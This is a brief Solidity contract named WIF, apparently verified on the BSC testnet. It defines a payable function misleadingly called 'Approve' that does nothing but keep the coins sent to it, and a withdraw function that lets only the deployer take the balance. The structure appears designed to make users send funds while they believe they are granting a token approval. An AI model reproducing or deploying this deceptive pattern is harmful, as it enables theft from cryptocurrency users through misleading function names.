/**
 *Submitted for verification at testnet.bscscan.com on 2024-05-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;


contract WIF {
    address owner;
    constructor(){
        owner = msg.sender;
    }
    receive() external payable {}

    function Approve() external payable  {
    }
    function getBalance() public view returns(uint){
        return address(this).balance;
    }
    function withdraw() public {
        require(msg.sender == owner);
        payable(msg.sender).transfer(address(this).balance);
    }
}